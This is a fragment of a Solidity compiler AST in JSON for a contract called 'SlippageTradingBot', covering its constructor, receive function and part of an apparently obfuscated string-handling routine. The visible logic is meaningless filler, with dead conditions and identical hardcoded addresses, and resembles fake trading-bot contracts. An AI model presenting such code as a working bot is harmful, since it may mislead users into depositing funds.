													"src": "468:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 10,
												"indexed": false,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 14,
												"src": "476:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 9,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "476:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 12,
												"indexed": false,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 14,
												"src": "482:6:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 11,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "482:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "467:22:0"
									},
									"src": "458:32:0"
								},
								{
									"body": {
										"id": 17,
										"nodeType": "Block",
										"src": "512:8:0",
										"statements": []
									},
									"id": 18,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 15,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "509:2:0"
									},
									"returnParameters": {
										"id": 16,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "512:0:0"
									},
									"scope": 1189,
									"src": "498:22:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 21,
										"nodeType": "Block",
										"src": "553:2:0",
										"statements": []
									},
									"id": 22,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "533:2:0"
									},
									"returnParameters": {
										"id": 20,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "553:0:0"
									},
									"scope": 1189,
									"src": "526:29:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"canonicalName": "SlippageTradingBot.slice",
									"id": 27,
									"members": [
										{
											"constant": false,
											"id": 24,
											"mutability": "mutable",
											"name": "_len",
											"nameLocation": "592:4:0",
											"nodeType": "VariableDeclaration",
											"scope": 27,
											"src": "587:9:0",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 23,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "587:4:0",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"visibility": "internal"
										},
										{
											"constant": false,
											"id": 26,
											"mutability": "mutable",
											"name": "_ptr",
											"nameLocation": "612:4:0",
											"nodeType": "VariableDeclaration",
											"scope": 27,
											"src": "607:9:0",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 25,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "607:4:0",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"visibility": "internal"
										}
									],
									"name": "slice",
									"nameLocation": "570:5:0",
									"nodeType": "StructDefinition",
									"scope": 1189,
									"src": "563:61:0",
									"visibility": "public"
								},
								{
									"body": {
										"id": 163,
										"nodeType": "Block",
										"src": "929:1268:0",
										"statements": [
											{
												"assignments": [
													33
												],
												"declarations": [
													{
														"constant": false,
														"id": 33,
														"mutability": "mutable",
														"name": "shortest",
														"nameLocation": "945:8:0",
														"nodeType": "VariableDeclaration",
														"scope": 163,
														"src": "940:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 32,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "940:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 35,
												"initialValue": {
													"hexValue": "30",
													"id": 34,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "956:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "940:17:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 38,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 36,
														"name": "shortest",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 33,
														"src": "973:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"hexValue": "31",
														"id": 37,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "984:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "973:12:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 43,
												"nodeType": "IfStatement",
												"src": "969:44:0",
												"trueBody": {
													"expression": {
														"id": 41,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"id": 39,
															"name": "shortest",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 33,
															"src": "1001:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"hexValue": "30",
															"id": 40,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1012:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "1001:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 42,
													"nodeType": "ExpressionStatement",
													"src": "1001:12:0"
												}
											},
											{
												"assignments": [
													45
												],
												"declarations": [
													{
														"constant": false,
														"id": 45,
														"mutability": "mutable",
														"name": "selfptr",
														"nameLocation": "1031:7:0",
														"nodeType": "VariableDeclaration",
														"scope": 163,
														"src": "1026:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 44,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1026:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 47,
												"initialValue": {
													"hexValue": "30",
													"id": 46,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "1041:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1026:16:0"
											},
											{
												"assignments": [
													49
												],
												"declarations": [
													{
														"constant": false,
														"id": 49,
														"mutability": "mutable",
														"name": "otherptr",
														"nameLocation": "1058:8:0",
														"nodeType": "VariableDeclaration",
														"scope": 163,
														"src": "1053:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 48,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1053:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 51,
												"initialValue": {
													"hexValue": "31",
													"id": 50,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "1069:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_1_by_1",
														"typeString": "int_const 1"
													},
													"value": "1"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1053:17:0"
											},
											{
												"body": {
													"id": 151,
													"nodeType": "Block",
													"src": "1129:1014:0",
													"statements": [
														{
															"assignments": [
																64
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 64,
																	"mutability": "mutable",
																	"name": "a",
																	"nameLocation": "1194:1:0",
																	"nodeType": "VariableDeclaration",
																	"scope": 151,
																	"src": "1189:6:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 63,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1189:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"visibility": "internal"
																}
															],
															"id": 65,
															"nodeType": "VariableDeclarationStatement",
															"src": "1189:6:0"
														},
														{
															"assignments": [
																67
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 67,
																	"mutability": "mutable",
																	"name": "b",
																	"nameLocation": "1215:1:0",
																	"nodeType": "VariableDeclaration",
																	"scope": 151,
																	"src": "1210:6:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 66,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1210:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"visibility": "internal"
																}
															],
															"id": 68,
															"nodeType": "VariableDeclarationStatement",
															"src": "1210:6:0"
														},
														{
															"assignments": [
																70
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 70,
																	"mutability": "mutable",
																	"name": "WETH_CONTRACT_ADDRESS",
																	"nameLocation": "1247:21:0",
																	"nodeType": "VariableDeclaration",
																	"scope": 151,
																	"src": "1233:35:0",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 69,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1233:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"visibility": "internal"
																}
															],
															"id": 72,
															"initialValue": {
																"hexValue": "307863303261616133396232323366653864306130653563346632376561643930383363373536636332",
																"id": 71,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1271:44:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_5270116ddce6ea9bbc0c25fe85461affe258517d80c431366a2308e1e2ce7379",
																	"typeString": "literal_string \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\""
																},
																"value": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1233:82:0"
														},
														{
															"assignments": [
																74
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 74,
																	"mutability": "mutable",
																	"name": "TOKEN_CONTRACT_ADDRESS",
																	"nameLocation": "1344:22:0",
																	"nodeType": "VariableDeclaration",
																	"scope": 151,
																	"src": "1330:36:0",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 73,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1330:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"visibility": "internal"
																}
															],
															"id": 76,
															"initialValue": {
																"hexValue": "307863303261616133396232323366653864306130653563346632376561643930383363373536636332",
																"id": 75,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1369:44:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_5270116ddce6ea9bbc0c25fe85461affe258517d80c431366a2308e1e2ce7379",
																	"typeString": "literal_string \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\""
																},
																"value": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1330:83:0"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"id": 78,
																		"name": "WETH_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 70,
																		"src": "1448:21:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 77,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 304,
																	"src": "1428:19:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 79,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1428:42:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 80,
															"nodeType": "ExpressionStatement",
															"src": "1428:42:0"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"id": 82,
																		"name": "TOKEN_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 74,
																		"src": "1505:22:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 81,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 304,
																	"src": "1485:19:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 83,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1485:43:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 84,
															"nodeType": "ExpressionStatement",
															"src": "1485:43:0"
														},
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "1552:91:0",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "1571:19:0",
																		"value": {
																			"arguments": [
																				{
																					"name": "selfptr",
																					"nodeType": "YulIdentifier",
																					"src": "1582:7:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1576:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1576:14:0"
																		},
																		"variableNames": [
																			{
																				"name": "a",
																				"nodeType": "YulIdentifier",
																				"src": "1571:1:0"
																			}
																		]
																	},
																	{
																		"nodeType": "YulAssignment",
																		"src": "1608:20:0",
																		"value": {
																			"arguments": [
																				{
																					"name": "otherptr",
																					"nodeType": "YulIdentifier",
																					"src": "1619:8:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1613:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1613:15:0"
																		},
																		"variableNames": [
																			{
																				"name": "b",
																				"nodeType": "YulIdentifier",
																				"src": "1608:1:0"
																			}
																		]
																	}
																]
															},
															"evmVersion": "shanghai",
															"externalReferences": [
																{
																	"declaration": 64,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1571:1:0",
																	"valueSize": 1
																},
																{
																	"declaration": 67,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1608:1:0",
																	"valueSize": 1
																},
																{
																	"declaration": 49,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1619:8:0",
																	"valueSize": 1
																},
																{
																	"declaration": 45,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1582:7:0",
																	"valueSize": 1
																}
															],
															"id": 85,
															"nodeType": "InlineAssembly",
															"src": "1543:100:0"
														},
														{
															"condition": {
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 88,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"id": 86,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 64,
																	"src": "1663:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"id": 87,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 67,
																	"src": "1668:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "1663:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"id": 142,
															"nodeType": "IfStatement",
															"src": "1659:416:0",
															"trueBody": {
																"id": 141,
																"nodeType": "Block",
																"src": "1671:404:0",
																"statements": [
																	{
																		"assignments": [
																			90
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 90,
																				"mutability": "mutable",
																				"name": "mask",
																				"nameLocation": "1782:4:0",
																				"nodeType": "VariableDeclaration",
																				"scope": 141,
																				"src": "1774:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 89,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "1774:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"visibility": "internal"
																			}
																		],
																		"id": 96,
																		"initialValue": {
																			"expression": {
																				"arguments": [
																					{
																						"id": 93,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "1794:7:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_uint256_$",
																							"typeString": "type(uint256)"
																						},
																						"typeName": {
																							"id": 92,
																							"name": "uint256",
																							"nodeType": "ElementaryTypeName",
																							"src": "1794:7:0",
																							"typeDescriptions": {}
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_type$_t_uint256_$",
																							"typeString": "type(uint256)"
																						}
																					],
																					"id": 91,
																					"name": "type",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 4294967269,
																					"src": "1789:4:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_metatype_pure$__$returns$__$",
																						"typeString": "function () pure"
																					}
																				},
																				"id": 94,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"nameLocations": [],
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "1789:13:0",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_meta_type_t_uint256",
																					"typeString": "type(uint256)"
																				}
																			},
																			"id": 95,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"memberLocation": "1803:3:0",
																			"memberName": "max",
																			"nodeType": "MemberAccess",
																			"src": "1789:17:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "1774:32:0"
																	},
																	{
																		"condition": {
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 99,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"id": 97,
																				"name": "shortest",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 33,
																				"src": "1830:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<",
																			"rightExpression": {
																				"hexValue": "3332",
																				"id": 98,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1841:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_32_by_1",
																					"typeString": "int_const 32"
																				},
																				"value": "32"
																			},
																			"src": "1830:13:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 119,
																		"nodeType": "IfStatement",
																		"src": "1827:105:0",
																		"trueBody": {
																			"id": 118,
																			"nodeType": "Block",
																			"src": "1845:87:0",
																			"statements": [
																				{
																					"expression": {
																						"id": 116,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"id": 100,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 90,
																							"src": "1866:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "=",
																						"rightHandSide": {
																							"id": 115,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"nodeType": "UnaryOperation",
																							"operator": "~",
																							"prefix": true,
																							"src": "1873:39:0",
																							"subExpression": {
																								"components": [
																									{
																										"commonType": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										},
																										"id": 113,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"leftExpression": {
																											"commonType": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											},
																											"id": 111,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": false,
																											"lValueRequested": false,
																											"leftExpression": {
																												"hexValue": "32",
																												"id": 101,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": true,
																												"kind": "number",
																												"lValueRequested": false,
																												"nodeType": "Literal",
																												"src": "1875:1:0",
																												"typeDescriptions": {
																													"typeIdentifier": "t_rational_2_by_1",
																													"typeString": "int_const 2"
																												},
																												"value": "2"
																											},
																											"nodeType": "BinaryOperation",
																											"operator": "**",
																											"rightExpression": {
																												"components": [
																													{
																														"commonType": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														},
																														"id": 109,
																														"isConstant": false,
																														"isLValue": false,
																														"isPure": false,
																														"lValueRequested": false,
																														"leftExpression": {
																															"hexValue": "38",
																															"id": 102,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": true,
																															"kind": "number",
																															"lValueRequested": false,
																															"nodeType": "Literal",
																															"src": "1881:1:0",
																															"typeDescriptions": {
																																"typeIdentifier": "t_rational_8_by_1",
																																"typeString": "int_const 8"
																															},
																															"value": "8"
																														},
																														"nodeType": "BinaryOperation",
																														"operator": "*",
																														"rightExpression": {
																															"components": [
																																{
																																	"commonType": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	},
																																	"id": 107,
																																	"isConstant": false,
																																	"isLValue": false,
																																	"isPure": false,
																																	"lValueRequested": false,
																																	"leftExpression": {
																																		"commonType": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		},
																																		"id": 105,
																																		"isConstant": false,
																																		"isLValue": false,
																																		"isPure": false,
																																		"lValueRequested": false,
																																		"leftExpression": {
																																			"hexValue": "3332",
																																			"id": 103,
																																			"isConstant": false,
																																			"isLValue": false,
																																			"isPure": true,
																																			"kind": "number",
																																			"lValueRequested": false,
																																			"nodeType": "Literal",
																																			"src": "1886:2:0",
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_rational_32_by_1",
																																				"typeString": "int_const 32"
																																			},
																																			"value": "32"
																																		},
																																		"nodeType": "BinaryOperation",
																																		"operator": "-",
																																		"rightExpression": {
																																			"id": 104,
																																			"name": "shortest",
																																			"nodeType": "Identifier",
																																			"overloadedDeclarations": [],
																																			"referencedDeclaration": 33,
																																			"src": "1891:8:0",
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_uint256",
																																				"typeString": "uint256"
																																			}
																																		},
																																		"src": "1886:13:0",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"nodeType": "BinaryOperation",
																																	"operator": "+",
																																	"rightExpression": {
																																		"id": 106,
																																		"name": "idx",
																																		"nodeType": "Identifier",
																																		"overloadedDeclarations": [],
																																		"referencedDeclaration": 53,
																																		"src": "1902:3:0",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"src": "1886:19:0",
																																	"typeDescriptions": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	}
																																}
																															],
																															"id": 108,
																															"isConstant": false,
																															"isInlineArray": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"nodeType": "TupleExpression",
																															"src": "1885:21:0",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														},
																														"src": "1881:25:0",
																														"typeDescriptions": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														}
																													}
																												],
																												"id": 110,
																												"isConstant": false,
																												"isInlineArray": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"nodeType": "TupleExpression",
																												"src": "1880:27:0",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											},
																											"src": "1875:32:0",
																											"typeDescriptions": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											}
																										},
																										"nodeType": "BinaryOperation",
																										"operator": "-",
																										"rightExpression": {
																											"hexValue": "31",
																											"id": 112,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": true,
																											"kind": "number",
																											"lValueRequested": false,
																											"nodeType": "Literal",
																											"src": "1910:1:0",
																											"typeDescriptions": {
																												"typeIdentifier": "t_rational_1_by_1",
																												"typeString": "int_const 1"
																											},
																											"value": "1"
																										},
																										"src": "1875:36:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									}
																								],
																								"id": 114,
																								"isConstant": false,
																								"isInlineArray": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"nodeType": "TupleExpression",
																								"src": "1874:38:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "1866:46:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 117,
																					"nodeType": "ExpressionStatement",
																					"src": "1866:46:0"
																				}
																			]
																		}
																	},
																	{
																		"assignments": [
																			121
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 121,
																				"mutability": "mutable",
																				"name": "diff",
																				"nameLocation": "1958:4:0",
																				"nodeType": "VariableDeclaration",
																				"scope": 141,
																				"src": "1950:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 120,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "1950:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"visibility": "internal"
																			}
																		],
																		"id": 131,
																		"initialValue": {
